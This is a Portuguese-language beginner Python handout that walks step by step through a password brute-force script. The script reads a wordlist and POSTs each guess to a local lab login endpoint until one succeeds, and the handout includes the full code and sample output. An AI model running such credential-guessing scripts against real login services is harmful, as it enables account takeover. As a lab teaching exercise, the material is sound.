# Apostila Prática: Automação Básica de Força Bruta em Python

**Público-alvo:** Alunos iniciantes em programação Python  
**Módulo:** UC11 — Requests, Manipulação de Arquivos e Testes Automatizados  
**Ambiente de Laboratório:** NexusBank Corporate  

---

## 1. Objetivo do Exercício

O objetivo desta prática é compreender como funciona a automação de um teste de autenticação em uma aplicação web.

Quando uma pessoa realiza login manualmente em um site, o processo é o seguinte:
1. Digita o nome de usuário e uma senha.
2. Clica no botão de entrar.
3. Se o sistema autorizar o acesso, o usuário entra no sistema.
4. Se o sistema recusar, a pessoa tenta outra senha.

O script que vamos construir automatiza exatamente essa rotina: ele lê uma lista de senhas candidatas de um arquivo de texto e envia cada uma diretamente para o servidor da aplicação. Assim que o servidor confirmar que a senha está correta, o programa interrompe as tentativas e exibe o resultado no terminal.

---

## 2. Conceitos Fundamentais Utilizados no Código

Para quem está tendo os primeiros contatos com programação, é importante compreender o papel de cada estrutura utilizada:

### A. Variáveis
Uma variável é um identificador que armazena uma informação na memória do computador para ser reutilizada ao longo do programa.
```python
url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"
```
* `url`: Guarda o endereço do serviço web (endpoint) onde o login é processado.
* `usuario`: Guarda o identificador da conta que estamos testando.
* `arquivo_senhas`: Guarda o nome do arquivo que contém os palpites de senha.

---

### B. Leitura de Arquivos com `with open(...)`
Para ler dados armazenados no disco, utilizamos a função `open()`:
```python
with open("senhas.txt", "r") as arquivo:
    for linha in arquivo:
        print(linha)
```
* O parâmetro `"r"` indica modo de leitura (*read*).
* A instrução `with` gerencia o ciclo de vida do arquivo: ela garante que o arquivo seja aberto e, ao término do bloco, devidamente fechado pelo sistema operacional, liberando a memória do computador.

---

### C. Estrutura de Repetição: O Laço `for`
O comando `for linha in arquivo:` instrui o Python a percorrer o arquivo linha por linha, do início ao fim.
A cada repetição (iteração), a variável `linha` recebe o conteúdo de uma linha do arquivo e executa as instruções programadas dentro daquele bloco.

---

### D. Tratamento de Strings: O Método `.strip()`
Em arquivos de texto, cada linha termina com um caractere especial invisível que representa a quebra de linha (`\n`), gerado quando pressionamos a tecla *Enter*.

Se o arquivo contém a palavra `123456`, ao ser lida pelo Python ela virá como `"123456\n"`.  
Se enviarmos essa string com a quebra de linha para o servidor, a autenticação falhará porque o caractere extra faz parte do texto enviado.

O método `.strip()` remove esses caracteres invisíveis e espaços em branco das extremidades da string:
```python
senha = linha.strip()  # Converte "123456\n" para "123456"
```

---

### E. Requisições HTTP com `requests.post()`
A biblioteca `requests` permite que um programa Python se comunique via rede com servidores web através do protocolo HTTP.

O método `requests.post()` envia dados estruturados para o servidor:
```python
dados = {"usuario": usuario, "senha": senha}
resposta = requests.post(url, json=dados)
```
* O parâmetro `json=dados` converte o dicionário Python para o formato JSON aceito pela API e configura os cabeçalhos de rede adequados.
* A variável `resposta` recebe o objeto retornado pelo servidor após o processamento da tentativa.

---

### F. Código de Status HTTP (`status_code`)
O servidor sempre responde a uma requisição com um código numérico padronizado:
* **Status 200 (OK):** A autenticação foi bem-sucedida; as credenciais enviadas são válidas.
* **Status 401 (Unauthorized):** As credenciais enviadas foram recusadas (usuário ou senha incorretos).

---

### G. Controle de Fluxo: A Instrução `break`
Quando a senha correta é encontrada (código de status igual a 200), não há motivo para continuar testando as senhas restantes da lista.
A instrução `break` interrompe imediatamente a execução do laço `for`, finalizando as tentativas.

```python
if resposta.status_code == 200:
    print("Senha encontrada:", senha)
    break  # Interrompe o laço imediatamente
```

---

## 3. Código Completo: `bruteforce_simples.py`

O script abaixo reúne todos esses conceitos de forma linear e objetiva, totalizando apenas 18 linhas de código:

```python
import requests

# 1. Parâmetros de configuração
url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"

print("Iniciando o teste de autenticação...")

# 2. Abertura do arquivo de senhas
with open(arquivo_senhas, "r") as arquivo:
    for linha in arquivo:
        senha = linha.strip()

        # 3. Envio da requisição com a credencial atual
        dados = {"usuario": usuario, "senha": senha}
        resposta = requests.post(url, json=dados)

        print(f"Testando senha: {senha} -> Status: {resposta.status_code}")

        # 4. Avaliação da resposta do servidor
        if resposta.status_code == 200:
            print("\n>>> AUTENTICAÇÃO REALIZADA COM SUCESSO! <<<")
            print(f"A senha do usuário '{usuario}' é: {senha}")
            break

print("Processo finalizado.")
```

---

## 4. Análise Linha a Linha do Script

| Linha(s) | Instrução | Descrição Técnica |
| :--- | :--- | :--- |
| `1` | `import requests` | Carrega o módulo responsável pelo envio de requisições HTTP na rede. |
| `4–6` | Definição de variáveis | Armazena a URL da API, o usuário alvo da tentativa e o nome do arquivo a ser lido. |
| `8` | `print(...)` | Exibe uma mensagem informativa de início no terminal. |
| `11` | `with open(arquivo_senhas, "r") as arquivo:` | Abre o arquivo em modo leitura e garante seu fechamento ao final do bloco. |
| `12` | `for linha in arquivo:` | Inicia o laço de repetição, processando uma linha do arquivo por iteração. |
| `13` | `senha = linha.strip()` | Remove o caractere de quebra de linha (`\n`) do final da string lida. |
| `16` | `dados = {"usuario": usuario, "senha": senha}` | Estrutura os dados de autenticação em formato de dicionário chave-valor. |
| `17` | `resposta = requests.post(url, json=dados)` | Dispara a requisição HTTP POST para o endpoint com os dados em JSON. |
| `19` | `print(...)` | Apresenta a senha recém-testada e o respectivo código de resposta retornado. |
| `22` | `if resposta.status_code == 200:` | Verifica se o servidor retornou código 200 (sucesso na autenticação). |
| `23–24`| `print(...)` | Informa que a credencial válida foi identificada e exibe o valor no terminal. |
| `25` | `break` | Interrompe o laço de repetição, evitando requisições desnecessárias. |
| `27` | `print(...)` | Notifica a conclusão do script. |

---

## 5. Roteiro de Execução no Laboratório

### 1. Criar o arquivo de senhas de teste
No mesmo diretório onde o script foi salvo, crie um arquivo chamado `senhas.txt` contendo alguns palpites, um por linha:
```text
111111
senha
qwerty
123456
admin123
```
*(No ambiente de laboratório, a senha da usuária `ana` foi configurada como `123456`).*

### 2. Executar o script no terminal
Abra o terminal na pasta do projeto e execute:
```bash
python bruteforce_simples.py
```

### 3. Saída esperada no terminal
```text
Iniciando o teste de autenticação...
Testando senha: 111111 -> Status: 401
Testando senha: senha -> Status: 401
Testando senha: qwerty -> Status: 401
Testando senha: 123456 -> Status: 200

>>> AUTENTICAÇÃO REALIZADA COM SUCESSO! <<<
A senha do usuário 'ana' é: 123456
Processo finalizado.
```
